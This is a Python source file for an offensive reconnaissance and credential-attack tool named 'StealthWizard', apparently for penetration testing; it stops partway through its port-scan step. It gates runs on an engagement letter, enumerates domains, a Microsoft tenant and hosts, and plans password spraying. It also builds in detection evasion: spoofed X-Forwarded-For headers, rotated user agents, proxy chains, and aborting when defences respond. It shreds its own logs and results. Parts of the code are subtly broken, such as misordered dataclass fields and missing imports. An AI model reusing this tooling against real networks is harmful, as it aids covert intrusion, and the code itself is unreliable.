import os
import json
import uuid
import datetime
import shutil
import subprocess
import re
import dns.resolver
import whois
import hashlib
import argparse
import yaml
import requests
import time
import csv
import random
import signal
import unicodedata
import gzip
import pathlib
import threading
import getpass
import ipaddress
import socket
from typing import List, Dict, Any, Optional, Tuple, Set
from dataclasses import dataclass, field
import logging
import logging.handlers
import sys
import io
import base64

# Dedicated libraries
try:
    from pypdf import PdfReader
except ImportError:
    pass
    PdfReader = None
try:
    import xml.etree.ElementTree as ET
except ImportError:
    pass
    ET = None

# Encryption Library
try:
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Util.Padding import pad, unpad
except ImportError as e:
    print(f"FATAL ERROR: Required encryption library (pycryptodome) not found. Install with 'pip install pycryptodome'.")
    sys.exit(1)

# Advanced Stealth & Evasion Libraries
try:
    import socks
    import aiohttp
    import asyncio
    import aiodns
    import async_timeout
    import aiofiles
    import asyncio_subproc
except ImportError as e:
    print(f"Warning: Stealth libraries not found. Some features disabled.\n{e}")
    socks = None
    aiohttp = None
    asyncio = None
    aiodns = None
    async_timeout = None
    aiofiles = None
    asyncio_subproc = None

# Custom Exception Hierarchy
class StealthToolError(Exception):
    pass

class ConfigurationError(StealthToolError):
    pass

class ToolExecutionError(StealthToolError):
    pass

class NetworkError(StealthToolError):
    pass

class DetectionError(StealthToolError):
    pass

class EncryptionError(StealthToolError):
    pass

class EngagementScopeError(StealthToolError):
    pass

# Pre-compiled Regex Patterns
DYNAMIC_MASKING_PATTERNS = [
    re.compile(r"User-Agent:.*?\r\n", re.IGNORECASE | re.DOTALL),
    re.compile(r"X-Forwarded-For:.*?\r\n", re.IGNORECASE | re.DOTALL),
    re.compile(r"Cookie:.*?\r\n", re.IGNORECASE | re.DOTALL),
    re.compile(r"Set-Cookie:.*?\r\n", re.IGNORECASE | re.DOTALL),
    re.compile(r"Authorization:.*?\r\n", re.IGNORECASE | re.DOTALL),
]
SENSITIVE_PATTERNS = [
    re.compile(r"authorization\s*[:=]\s*?\S+", re.IGNORECASE),
    re.compile(r"x-ms-access-token\s*[:=]\s*?\S+", re.IGNORECASE),
    re.compile(r"password\s*[:=]\s*?.+?(?=\s|$|\"|\')", re.IGNORECASE),
    re.compile(r":::[^:]+:[^:]+:[^:]+:[^:]+(?::|$)", re.IGNORECASE),
    re.compile(r"NTLMv[12]\s+Response:\s*?\S+", re.IGNORECASE),
    re.compile(r"key\s*[:=]\s*?\S+", re.IGNORECASE),
    re.compile(r"secret\s*[:=]\s*?\S+", re.IGNORECASE),
    re.compile(r"private_key\s*[:=]\s*?.*?-----END.*?KEY-----", re.IGNORECASE | re.DOTALL),
]

# OPSEC Configuration
OPSEC_CONFIG = {
    "jitter_seconds": (1.0, 5.0),
    "low_and": True,
    "low_and_factor": 5.0,
    "proxy_chain": [],
    "user_agents": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML) Version/16.6 Safari/605.1.15",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0",
    ],
    "exit_on_idle": True,
    "detection_threshold": 3,
    "temp_file_encryption": "aes-256-cbc",
    "temp_file_cleanup_policy": "shred",
    "audit_log_encryption": "aes-256-cbc",
    "audit_log_key_management": "external",
    "command_execution": False,
    "dns_over": True,
    "doh_resolvers": ["https://cloudflare-dns.com/dns-query", "https://dns.google/dns-query"],
    "network_timeout": 20.0,
    "connect_timeout": 10.0,
    "exclusion_list": [],
    "min_password_spray_attempts": 3,
    "lockout_wait_multiplier": 2.0,
    "scan_signature_profiling": True,
}

# Thread-safe abort event
ABORT_EVENT = threading.Event()

# Global pointers
job_context: Optional['Job'] = None
event_loop: Optional[asyncio.EventLoop] = None

def signal_handler(signum, frame):
    """Handles signals for graceful shutdown."""
    print(f"[StealthSys] Signal {signum} received. Initiating shutdown...")
    ABORT_EVENT.set()
    if job_context:
        try:
            asyncio.run_coroutine_threadsafe(
                job_context._log_audit({"event": "Shutdown Initiated", "signal": signum, "timestamp": str(datetime.datetime.now())}),
                event_loop
            )
        except Exception as e:
            stealth_logger.error(f"[StealthSys] Error logging shutdown: {e}")
    if event_loop and event_loop.is_running():
        event_loop.call_soon_threadsafe(event_loop.stop)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

class StealthFormatter(logging.Formatter):
    """Custom formatter for redacting sensitive data."""
    def format(self, record):
        record_copy = logging.makeLogRecord(record.__dict__)
        msg = record.getMessage()
        redacted = msg
        for pattern in DYNAMIC_MASKING_PATTERNS:
            redacted = pattern.sub(lambda m: m.group(0).split(':')[0] + ': ---MASKED---\r\n', redacted)
        for pattern in SENSITIVE_PATTERNS:
            redacted = pattern.sub("---REDACTED---", redacted)
        record_copy.msg = redacted
        try:
            return super().format(record_copy)
        finally:
            record_copy.msg = msg

LOG_LEVEL = logging.INFO
if os.getenv("DEBUG_STEALTH"):
    LOG_LEVEL = logging.DEBUG
logging.basicConfig(level=LOG_LEVEL, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
stealth_logger = logging.getLogger("StealthTool")
stealth_logger.handlers.clear()
console_handler = logging.StreamHandler(sys.stdout)
console_handler.setFormatter(StealthFormatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
stealth_logger.addHandler(console_handler)
stealth_logger.setLevel(LOG_LEVEL)

def contains_any(haystack: str, terms: Tuple[str]) -> bool:
    hay = haystack.lower()
    return any(t.lower() in hay for t in terms)

def generate_secure_key(key_size: int = 32) -> bytes:
    return get_random_bytes(key_size)

async def encrypt_data(data: bytes, key: bytes, iv: bytes) -> bytes:
    try:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        padded_data = pad(data, AES.block_size)
        return cipher.encrypt(padded_data)
    except Exception as e:
        raise EncryptionError(f"Encryption failed: {e}")

async def decrypt_data(encrypted_data: bytes, key: bytes, iv: bytes) -> bytes:
    try:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_padded = cipher.decrypt(encrypted_data)
        return unpad(decrypted_padded, AES.block_size)
    except ValueError as e:
        raise EncryptionError(f"Decryption failed (padding error): {e}")
    except Exception as e:
        raise EncryptionError(f"Decryption failed: {e}")

async def shred_file_async(filepath: pathlib.Path, passes: int = 3):
    try:
        if not await aiofiles.os.path.exists(filepath):
            return
        file_size = (await aiofiles.os.stat(filepath)).st_size
        async with aiofiles.open(filepath, 'wb') as f:
            for _ in range(passes):
                await f.seek(0)
                await f.write(get_random_bytes(file_size))
                await f.flush()
        await aiofiles.os.remove(filepath)
        stealth_logger.debug(f"[StealthSys] Shredded file: {filepath}")
    except FileNotFoundError:
        pass
    except Exception as e:
        stealth_logger.warning(f"[StealthSys] Error shredding {filepath}: {e}")
        try:
            await aiofiles.os.remove(filepath)
        except Exception as e_unlink:
            stealth_logger.error(f"[StealthSys] Error deleting {filepath}: {e_unlink}")

@dataclass
class Credential:
    username: str
    password: Optional[str] = field(default=None, repr=False)
    hash_nt: Optional[str] = field(default=None, repr=False)
    hash_lm: Optional[str] = field(default=None, repr=False)
    service: str
    type: str
    source: str
    mfa: Optional[bool] = None
    valid: bool = False
    privilege_level: str = "unknown"
    note: str = ""
    timestamp_found: str = field(default_factory=lambda: str(datetime.datetime.now()))
    validation_method: Optional[str] = None
    is_spray_candidate: bool = False
    is_hashcat_crack: bool = False

    def __post_init__(self):
        if self.type == "plaintext" and self.password:
            try:
                self.hash_nt = hashlib.new('md4', self.password.encode('utf-16le')).hexdigest().upper()
                self.hash_lm = "LM_HASH_SKIPPED"
                self.password = None
            except Exception:
                self.hash_nt = "HASH_CALC_ERROR"
        elif self.type == "hash" and self.password:
            hash_value = self.password.strip().upper()
            if len(hash_value) == 32 and re.fullmatch(r"[0-9A-F]{32}", hash_value):
                self.hash_nt = hash_value
            elif len(hash_value) == 64 and re.fullmatch(r"[0-9A-F]{64}", hash_value):
                self.hash_nt = f"SHA256:{hash_value}"
            else:
                self.hash_nt = f"UNKNOWN:{hash_value[:16]}..."
            self.password = None
            self.type = "hash"
        valid_privileges = {"unknown", "user", "admin", "domain_admin", "enterprise_admin", "global_admin", "service_account"}
        self.privilege_level = self.privilege_level.lower() if self.privilege_level.lower() in valid_privileges else "unknown"

    def to_dict(self, include_sensitive: bool = False):
        data = self.__dict__.copy()
        if not include_sensitive:
            data.pop('password', None)
        return data

@dataclass
class TargetInfo:
    root_domains: List[str]
    suspected_cloud_tenant: str
    cloud_tenant_status: str
    optional_targets: List[str]
    resolved_ips: List[str] = field(default_factory=list)
    potential_ad_hosts: List[str] = field(default_factory=list)
    domain_sid: str = ""
    forest_name: str = ""
    domain_controllers: List[str] = field(default_factory=list)
    domain_functional_level: str = ""
    verified: bool = False
    netbios_name: Optional[str] = None
    ad_domain_fqdn: Optional[str] = None

@dataclass
class Job:
    uuid: str
    company: str
    testing_window: str
    engagement_letter_path: str
    timestamp_start: str
    timestamp_end: str = ""
    status: str = "initialized"
    target: TargetInfo = field(default_factory=lambda: TargetInfo([], "", "", []))
    recon_results: Dict[str, Any] = field(default_factory=dict)
    harvest_results: Dict[str, Any] = field(default_factory=dict)
    audit_log_path: str = ""
    results_dir: str = ""
    config: Dict[str, Any] = field(default_factory=dict)
    tool_cache: Dict[str, str] = field(default_factory=dict)
    rate_limit_state: Dict[str, float] = field(default_factory=dict)
    temp_dir: str = ""
    audit_log_key: bytes = field(repr=False, default=b'')
    audit_log_iv: bytes = field(repr=False, default=b'')
    temp_file_key: bytes = field(repr=False, default=b'')
    temp_file_iv: bytes = field(repr=False, default=b'')
    detection_indicators: List[Dict[str, Any]] = field(default_factory=list)
    opsec: Dict[str, Any] = field(default_factory=dict)
    async_session: Any = field(default=None, repr=False)
    async_dns_resolver: Any = field(default=None, repr=False)

    async def _log_audit(self, data: Dict[str, Any]):
        if ABORT_EVENT.is_set() or not self.audit_log_path or not self.audit_log_key:
            stealth_logger.error("Audit logging not configured.")
            try:
                redacted = self._redact_sensitive_data(data)
                stealth_logger.error(f"Fallback audit log: {json.dumps(redacted, default=str)}")
            except Exception as e:
                print(f"FATAL: Fallback audit logging failed: {e}")
            return
        entry_iv = get_random_bytes(AES.block_size)
        redacted_data = self._redact_sensitive_data(data)
        try:
            plaintext = entry_iv + (json.dumps(redacted_data, default=str) + '\n').encode('utf-8')
            encrypted = await encrypt_data(plaintext, self.audit_log_key, entry_iv)
            async with aiofiles.open(self.audit_log_path, 'ab') as f:
                await f.write(encrypted)
        except Exception as e:
            stealth_logger.error(f"Error writing audit log: {e}")

    def _redact_sensitive_data(self, data: Any) -> Any:
        if isinstance(data, dict):
            return {k: "---REDACTED_KEY---" if any(re.search(p, k, re.IGNORECASE) for p in SENSITIVE_PATTERNS) else self._redact_sensitive_data(v) for k, v in data.items()}
        elif isinstance(data, (list, tuple, set)):
            return [self._redact_sensitive_data(item) for item in data]
        elif isinstance(data, str):
            redacted = data
            for pattern in DYNAMIC_MASKING_PATTERNS + SENSITIVE_PATTERNS:
                redacted = pattern.sub("---REDACTED---", redacted)
            return redacted
        return data

    async def _check_for_detection(self):
        if self.opsec.get("exit_on_detection", True) and len(self.detection_indicators) >= self.opsec.get("detection_threshold", 3):
            reason = f"Detection threshold ({self.opsec['detection_threshold']}) exceeded."
            stealth_logger.critical(f"[StealthSys] {reason}")
            await self._abort_wizard(reason)

class StealthWizard:
    def __init__(self, config: Dict[str, Any], args: argparse.Namespace):
        self.config = config or {}
        self.args = args
        self.job: Optional[Job] = None
        self._temp_files: List[pathlib.Path] = []
        self.opsec = {**OPSEC_CONFIG, **self.config.get("opsec", {})}
        stealth_logger.setLevel(LOG_LEVEL)

    async def run(self):
        global event_loop
        try:
            event_loop = asyncio.get_running_loop()
            stealth_logger.debug("Using existing event loop.")
        except RuntimeError:
            event_loop = asyncio.new_event_loop()
            asyncio.set_event_loop(event_loop)
            stealth_logger.debug("Created new event loop.")

        try:
            if await self.gatekeeper():
                global job_context
                job_context = self.job
                if await self.target_definition():
                    if await self.recon_surface_mapping():
                        if self.job.status != "halted_after_recon":
                            if await self.credential_harvest_spray():
                                stealth_logger.info("[StealthSys] Core phases completed.")
                            else:
                                stealth_logger.warning("[StealthSys] Credential harvest failed.")
                        else:
                            stealth_logger.warning("[StealthSys] Halted due to low AD score.")
                    else:
                        stealth_logger.warning("[StealthSys] Recon failed.")
                else:
                    stealth_logger.warning("[StealthSys] Target definition failed.")
            else:
                stealth_logger.warning("[StealthSys] Gatekeeper failed.")
            if self.job and self.job.status == "running":
                self.job.status = "completed"
                self.job.timestamp_end = str(datetime.datetime.now())
        except Exception as e:
            stealth_logger.critical(f"[StealthSys] Unhandled exception: {e}", exc_info=True)
            if self.job:
                await self.job._log_audit({"event": "Unhandled Exception", "error": str(e), "traceback": traceback.format_exc(), "timestamp": str(datetime.datetime.now())})
                self.job.status = "failed"
                self.job.timestamp_end = str(datetime.datetime.now())
        finally:
            await self._cleanup_temp_files()
            await self._secure_cleanup_results()
            if self.job:
                await self.job._log_audit({"event": "Wizard Complete", "status": self.job.status, "timestamp": str(datetime.datetime.now())})
                stealth_logger.info(f"[StealthSys] Execution Finished: UUID {self.job.uuid}, Status {self.job.status}")

    async def _get_tool_path(self, tool_name: str) -> Optional[pathlib.Path]:
        if ABORT_EVENT.is_set():
            return None
        if self.job and tool_name in self.job.tool_cache:
            return pathlib.Path(self.job.tool_cache[tool_name])
        tool_paths = self.config.get("tool_paths", {})
        candidates = tool_paths.get(tool_name, [tool_name])
        if isinstance(candidates, str):
            candidates = [candidates]
        for candidate in candidates:
            try:
                path = await asyncio.get_running_loop().run_in_executor(None, shutil.which, candidate)
                if path:
                    resolved_path = pathlib.Path(path).resolve()
                    if self.job:
                        self.job.tool_cache[tool_name] = str(resolved_path)
                    return resolved_path
            except Exception as e:
                stealth_logger.debug(f"Error checking tool {candidate}: {e}")
        stealth_logger.error(f"Tool '{tool_name}' not found.")
        if self.job:
            await self.job._log_audit({"event": "Tool Not Found", "tool": tool_name, "timestamp": str(datetime.datetime.now())})
            await self._abort_wizard(f"Tool '{tool_name}' not found.")
        return None

    async def _create_directories(self, path: pathlib.Path) -> bool:
        if ABORT_EVENT.is_set():
            return False
        try:
            await aiofiles.os.makedirs(path, mode=0o700, exist_ok=True)
            stealth_logger.debug(f"Created directory: {path}")
            return True
        except Exception as e:
            stealth_logger.error(f"Error creating directory {path}: {e}")
            if self.job:
                await self.job._log_audit({"event": "Directory Creation Error", "directory": str(path), "error": str(e), "timestamp": str(datetime.datetime.now())})
            return False

    async def _write_temp_file(self, content: str, prefix: str = "tmp", suffix: str = "") -> Optional[pathlib.Path]:
        if ABORT_EVENT.is_set() or not self.job or not self.job.temp_dir or not self.job.temp_file_key:
            stealth_logger.error("Temp file encryption not configured.")
            return None
        try:
            temp_dir = pathlib.Path(self.job.temp_dir)
            if not await self._create_directories(temp_dir):
                return None
            temp_file = temp_dir / f"{prefix}_{uuid.uuid4()}{suffix}.enc"
            plaintext = content.encode('utf-8')
            file_iv = get_random_bytes(AES.block_size)
            encrypted = await encrypt_data(plaintext, self.job.temp_file_key, file_iv)
            final_content = file_iv + encrypted
            async with aiofiles.open(temp_file, 'wb') as f:
                await f.write(final_content)
            self._temp_files.append(temp_file)
            stealth_logger.debug(f"Created temp file: {temp_file}")
            if self.job:
                await self.job._log_audit({"event": "Temp File Created", "file": str(temp_file), "timestamp": str(datetime.datetime.now())})
            return temp_file
        except Exception as e:
            stealth_logger.error(f"Error writing temp file: {e}")
            return None

    async def _read_temp_file(self, filepath: pathlib.Path) -> Optional[str]:
        if ABORT_EVENT.is_set() or not await aiofiles.os.path.exists(filepath) or not self.job or not self.job.temp_file_key:
            return None
        try:
            async with aiofiles.open(filepath, 'rb') as f:
                content = await f.read()
            iv_size = AES.block_size
            if len(content) < iv_size:
                raise EncryptionError("File too short for IV.")
            file_iv, encrypted = content[:iv_size], content[iv_size:]
            plaintext = await decrypt_data(encrypted, self.job.temp_file_key, file_iv)
            return plaintext.decode('utf-8', errors='ignore')
        except Exception as e:
            stealth_logger.error(f"Error reading temp file {filepath}: {e}")
            return None

    async def _execute_command(self, command: List[str], cwd: Optional[pathlib.Path] = None, timeout: Optional[float] = None, quiet: bool = True) -> Tuple[str, str]:
        if ABORT_EVENT.is_set():
            return "", ""
        command_copy = command[:]
        audit_start = datetime.datetime.now()
        executable_path = await self._get_tool_path(command_copy[0])
        if not executable_path:
            raise ToolExecutionError(f"Tool {command_copy[0]} not found.")
        command_copy[0] = str(executable_path)
        if self.opsec.get("command_execution", False):
            sandbox_tool = await asyncio.get_running_loop().run_in_executor(None, shutil.which, "firejail")
            if sandbox_tool:
                command_copy = [sandbox_tool, "--quiet", "--noprofile", "--nodbus", "--nolog", "--private=.", "--", *command_copy]
            else:
                stealth_logger.warning("Sandboxing enabled but firejail not found.")
        env = os.environ.copy()
        if self.opsec.get("proxy_chain"):
            proxy = random.choice(self.opsec["proxy_chain"])
            if "http" in proxy.lower():
                env['HTTP_PROXY'] = env['HTTPS_PROXY'] = proxy
            elif "socks" in proxy.lower():
                env['ALL_PROXY'] = proxy
            env['NO_PROXY'] = ",".join(["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "127.0.0.1/8"] + self.opsec.get("exclusion_list", []))
        log_command = [ "---REDACTED_ARG---" if any(re.search(p, arg, re.IGNORECASE) for p in SENSITIVE_PATTERNS) else arg for arg in command_copy ]
        stealth_logger.info(f"Executing: {' '.join(log_command)}")
        stdout_str, stderr_str = "", ""
        returncode = -1
        process = None
        try:
            process = await asyncio.create_subprocess_exec(
                *command_copy, cwd=str(cwd) if cwd else None, stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE, env=env
            )
            async with async_timeout.timeout(timeout or self.opsec.get("network_timeout", 60.0)):
                stdout_bytes, stderr_bytes = await process.communicate()
            stdout_str = stdout_bytes.decode('utf-8', errors='ignore').strip()
            stderr_str = stderr_bytes.decode('utf-8', errors='ignore').strip()
            returncode = process.returncode
            if not quiet:
                stealth_logger.debug(f"Stdout: {stdout_str[:500]}...")
                stealth_logger.debug(f"Stderr: {stderr_str[:500]}...")
        except Exception as e:
            stealth_logger.error(f"Error executing command: {e}")
            raise ToolExecutionError(str(e))
        finally:
            if process and process.returncode is None:
                try:
                    process.terminate()
                    await asyncio.wait_for(process.wait(), timeout=5.0)
                except Exception:
                    process.kill()
            if self.job:
                await self.job._log_audit({
                    "event": "Command Executed", "command": ' '.join(log_command),
                    "output_preview": stdout_str[:500], "error_preview": stderr_str[:500],
                    "returncode": returncode, "timestamp_start": str(audit_start),
                    "timestamp_end": str(datetime.datetime.now())
                })
        detection_indicators = []
        if contains_any(stderr_str, ("alert", "detection", "block", "quarantine", "access denied", "firewall")):
            detection_indicators.append({"message": "Security control detected", "source": f"Stderr: {stderr_str[:100]}"})
        self.job.detection_indicators.extend(detection_indicators)
        await self._check_for_detection()
        return stdout_str, stderr_str

    async def _execute_async_request(self, method: str, url: str, headers: Optional[Dict[str, str]] = None, data: Optional[Any] = None, json: Optional[Dict[str, Any]] = None, timeout: Optional[float] = None, allow_redirects: bool = True) -> Optional[aiohttp.ClientResponse]:
        if ABORT_EVENT.is_set() or not aiohttp or not self.job.async_session:
            return None
        request_headers = headers or {}
        request_headers['User-Agent'] = random.choice(self.opsec.get("user_agents", ["StealthTool/1.0"]))
        request_headers['Referer'] = f"https://{self.job.target.root_domains[0] if self.job.target.root_domains else 'example.com'}/"
        request_headers['X-Forwarded-For'] = f"192.168.1.{random.randint(1, 254)}"
        proxy = random.choice(self.opsec.get("proxy_chain")) if self.opsec.get("proxy_chain") else None
        try:
            async with async_timeout.timeout(timeout or self.opsec.get("network_timeout", 20.0)):
                async with self.job.async_session.request(
                    method, url, headers=request_headers, data=data, json=json, proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=timeout or self.opsec.get("network_timeout", 20.0)),
                    allow_redirects=allow_redirects, verify_ssl=False
                ) as response:
                    detection_indicators = []
                    if contains_any(str(response.headers), ("waf", "block", "captcha")):
                        detection_indicators.append({"message": "Security control in headers", "source": f"Headers: {str(response.headers)[:100]}"})
                    body_preview = (await response.text())[:500].lower()
                    if contains_any(body_preview, ("blocked", "access denied", "captcha")):
                        detection_indicators.append({"message": "Security control in body", "source": f"Body: {body_preview[:100]}"})
                    self.job.detection_indicators.extend(detection_indicators)
                    await self._check_for_detection()
                    return response
        except Exception as e:
            stealth_logger.error(f"Async request failed: {e}")
            return None

    async def _abort_wizard(self, reason: str = "Unknown reason"):
        if ABORT_EVENT.is_set():
            return
        ABORT_EVENT.set()
        stealth_logger.critical(f"[StealthSys] Aborted: {reason}")
        if self.job:
            self.job.status = "aborted"
            self.job.timestamp_end = str(datetime.datetime.now())
            await self.job._log_audit({"event": "Aborted", "reason": reason, "timestamp": str(datetime.datetime.now())})
        await self._cleanup_temp_files()
        await self._secure_cleanup_results()
        if event_loop and event_loop.is_running():
            event_loop.stop()
        sys.exit(1)

    async def _cleanup_temp_files(self):
        cleanup_policy = self.opsec.get("temp_file_cleanup_policy", "shred").lower()
        tasks = []
        for temp_file in self._temp_files[:]:
            if await aiofiles.os.path.exists(temp_file):
                tasks.append(shred_file_async(temp_file) if cleanup_policy == "shred" else aiofiles.os.remove(temp_file))
            self._temp_files.remove(temp_file)
        await asyncio.gather(*tasks, return_exceptions=True)
        stealth_logger.debug("Temp file cleanup complete.")

    async def _secure_cleanup_results(self):
        if not self.job or not self.job.results_dir:
            return
        results_dir = pathlib.Path(self.job.results_dir)
        if not await aiofiles.os.path.exists(results_dir):
            return
        cleanup_policy = self.opsec.get("temp_file_cleanup_policy", "shred").lower()
        tasks = []
        async def walk_dir():
            for root, _, files in await asyncio.get_running_loop().run_in_executor(None, lambda: list(os.walk(results_dir, topdown=False))):
                for name in files:
                    filepath = pathlib.Path(root) / name
                    tasks.append(shred_file_async(filepath) if cleanup_policy == "shred" else aiofiles.os.remove(filepath))
                for name in _:
                    dirpath = pathlib.Path(root) / name
                    try:
                        await aiofiles.os.rmdir(dirpath)
                    except Exception as e:
                        stealth_logger.error(f"Error removing dir {dirpath}: {e}")
        await walk_dir()
        await asyncio.gather(*tasks, return_exceptions=True)
        try:
            await aiofiles.os.rmdir(results_dir)
        except Exception as e:
            stealth_logger.error(f"Error removing results dir: {e}")

    async def gatekeeper(self) -> bool:
        print("[StealthSys] --- Gatekeeper ---")
        stealth_logger.info("Initiating Gatekeeper.")
        el_path = pathlib.Path(self.args.engagement_letter).resolve()
        if not await aiofiles.os.path.isfile(el_path) or el_path.suffix.lower() != ".pdf":
            await self._abort_wizard(f"Invalid engagement letter: {el_path}")
        base_dir = pathlib.Path(self.config.get("results_directory", "results")).resolve()
        results_dir = base_dir / self.args.run_uuid
        audit_log_dir = results_dir / "audit_logs"
        output_dir = results_dir / "output"
        temp_dir = results_dir / "temp"
        for dir_path in [base_dir, results_dir, audit_log_dir, output_dir, temp_dir]:
            if not await self._create_directories(dir_path):
                await self._abort_wizard(f"Failed to create directory {dir_path}")
        audit_log_path = audit_log_dir / f"{self.args.run_uuid}.audit.log.enc"
        audit_log_key, temp_file_key = generate_secure_key(), generate_secure_key()
        self.job = Job(
            uuid=self.args.run_uuid, company=self.args.company_name, testing_window=self.args.testing_window,
            engagement_letter_path=str(el_path), timestamp_start=str(datetime.datetime.now()),
            audit_log_path=str(audit_log_path), results_dir=str(results_dir), temp_dir=str(temp_dir),
            config=self.config, audit_log_key=audit_log_key, temp_file_key=temp_file_key,
            opsec=self.opsec
        )
        self.job.async_session = aiohttp.ClientSession(
            headers={'User-Agent': random.choice(self.opsec["user_agents"])},
            connector=aiohttp.TCPConnector(limit=100, enable_cleanup_closed=True)
        )
        if aiodns:
            self.job.async_dns_resolver = aiodns.DNSResolver(loop=event_loop)
        await self.job._log_audit({"event": "Wizard Start", "uuid": self.job.uuid, "who": getpass.getuser()})
        async with aiofiles.open(el_path, 'rb') as f:
            pdf_content = await f.read()
        letter_text = ""
        if PdfReader:
            try:
                reader = PdfReader(io.BytesIO(pdf_content))
                letter_text = "".join(page.extract_text() or "" for page in reader.pages)
            except Exception as e:
                stealth_logger.warning(f"PdfReader failed: {e}")
        if not letter_text:
            pdftotext = await self._get_tool_path('pdftotext')
            if pdftotext:
                temp_pdf = await self._write_temp_file(pdf_content.decode('latin1'), suffix=".pdf")
                stdout, stderr = await self._execute_command([str(pdftotext), str(temp_pdf), '-'])
                letter_text = stdout
        if not letter_text.strip():
            await self._abort_wizard("No readable text in engagement letter.")
        if unicodedata.normalize('NFKD', self.job.company).casefold() not in unicodedata.normalize('NFKD', letter_text).casefold():
            await self._abort_wizard(f"Company name not found in engagement letter.")
        self.job.status = "running"
        return True

    async def _resolve_domains_to_ips(self, domains: List[str]) -> List[str]:
        resolved_ips = []
        use_doh = self.opsec.get("dns_over", False) and self.job.async_session
        resolvers = self.opsec.get("doh_resolvers", []) if use_doh else []
        async def doh_lookup(domain, resolver):
            try:
                async with self.job.async_session.get(resolver, params={'name': domain, 'type': 'A'}) as resp:
                    data = await resp.json()
                    return [answer['data'] for answer in data.get('Answer', []) if answer.get('type') == 1]
            except Exception as e:
                stealth_logger.warning(f"DoH failed for {domain}: {e}")
                return []
        async def system_lookup(domain):
            try:
                if self.job.async_dns_resolver:
                    answers = await self.job.async_dns_resolver.query(domain, 'A')
                    return [str(rdata.host) for rdata in answers]
                else:
                    answers = await asyncio.get_running_loop().run_in_executor(None, lambda: dns.resolver.resolve(domain, 'A'))
                    return [str(rdata) for rdata in answers]
            except Exception as e:
                stealth_logger.warning(f"System DNS failed for {domain}: {e}")
                return []
        tasks = []
        for domain in domains:
            if use_doh and resolvers:
                tasks.append(doh_lookup(domain, random.choice(resolvers)))
            else:
                tasks.append(system_lookup(domain))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for result in results:
            if isinstance(result, list):
                resolved_ips.extend(result)
        return list(set(resolved_ips))

    async def target_definition(self) -> bool:
        print("[StealthSys] --- Target Definition ---")
        target_config = self.config.get("target_definition", {})
        domains = [d.strip() for d in target_config.get("root_domains", "").split(',') if d.strip()]
        cloud_tenant = target_config.get("suspected_cloud_tenant", "").strip()
        optional_targets = [t.strip() for t in target_config.get("optional_targets", "").split(',') if t.strip()]
        validated_domains = []
        for domain in domains:
            try:
                w = await asyncio.get_running_loop().run_in_executor(None, whois.whois, domain)
                if w and unicodedata.normalize('NFKD', self.job.company).casefold() in unicodedata.normalize('NFKD', str(w)).casefold():
                    validated_domains.append(domain)
                else:
                    ips = await self._resolve_domains_to_ips([domain])
                    if ips:
                        validated_domains.append(domain)
            except Exception as e:
                stealth_logger.warning(f"WHOIS error for {domain}: {e}")
        validated_targets = []
        for target in optional_targets:
            try:
                ipaddress.ip_network(target, strict=False)
                validated_targets.append(target)
            except ValueError:
                ips = await self._resolve_domains_to_ips([target])
                if ips:
                    validated_targets.append(target)
        if not validated_domains and not validated_targets:
            await self._abort_wizard("No valid targets.")
        cloud_status = "Unknown"
        if cloud_tenant:
            url = f"https://login.microsoftonline.com/getuserrealm.srf?login=testuser@{cloud_tenant}&xml=1"
            response = await self._execute_async_request("GET", url)
            if response and response.status == 200:
                text = await response.text()
                cloud_status = "Managed" if "Managed" in text else "Federated" if "Federated" in text else "Unclear"
        self.job.target = TargetInfo(
            root_domains=validated_domains, suspected_cloud_tenant=cloud_tenant,
            cloud_tenant_status=cloud_status, optional_targets=validated_targets, verified=True
        )
        return True

    async def recon_surface_mapping(self) -> bool:
        print("[StealthSys] --- Recon & Surface Mapping ---")
        self.job.recon_results = {
            "passive_assets": [], "active_scanned_ips": [], "potential_ad_hosts": [],
            "ad_likelihood_score": 0, "nmap_xml_path": "", "hunterio_emails": [],
            "resolved_hostnames": {}, "open_ports_by_ip": {}, "service_details": {}
        }
        passive_config = self.config.get("recon_surface_mapping", {}).get("passive_recon", {})
        if passive_config.get("enabled", True):
            domains = list(set(self.job.target.root_domains + ([self.job.target.suspected_cloud_tenant] if self.job.target.suspected_cloud_tenant else [])))
            self.job.target.resolved_ips = await self._resolve_domains_to_ips(domains)
            crtsh_tool = await self._get_tool_path('certsh.py')
            if crtsh_tool:
                for domain in domains:
                    stdout, _ = await self._execute_command([str(crtsh_tool), domain])
                    try:
                        reader = csv.reader(io.StringIO(stdout))
                        next(reader) # Skip header
                        for row in reader:
                            if len(row) >= 3 and all(cell.strip() for cell in row[:3]):
                                self.job.recon_results["passive_assets"].append({"fqdn": row[0], "ip": row[1], "open_ports": row[2]})
                    except Exception as e:
                        stealth_logger.warning(f"Error parsing crt.sh: {e}")
        active_config = self.config.get("recon_surface_mapping", {}).get("active_scan", {})
        if active_config.get("enabled", True):
            scan_targets = set(self.job.target.resolved_ips)
            for target in self.job.target.optional_targets:
                try:
                    network = ipaddress.ip_network(target, strict=False)
                    if network.num_addresses <= active_config.get("cidr_expansion_limit", 65536):
                        scan_targets.update(str(ip) for ip in network.hosts())
                except ValueError:
                    scan_targets.add(target)
            exclusion_list = self.opsec.get("exclusion_list", []) + active_config.get("exclusion_list", [])
            final_targets = [t for t in scan_targets if not any(ipaddress.ip_address(t) in ipaddress.ip_network(excl) for excl in exclusion_list)]
            self.job.recon_results["active_scanned_ips"] = final_targets
            masscan_targets = await self._write_temp_file("\n".join(final_targets), suffix=".txt")
            masscan = await self._get_tool_path('masscan')
            if masscan and masscan_targets:
                masscan_output = pathlib.Path(self.job.temp_dir) / f"{self.job.uuid}_masscan.json"
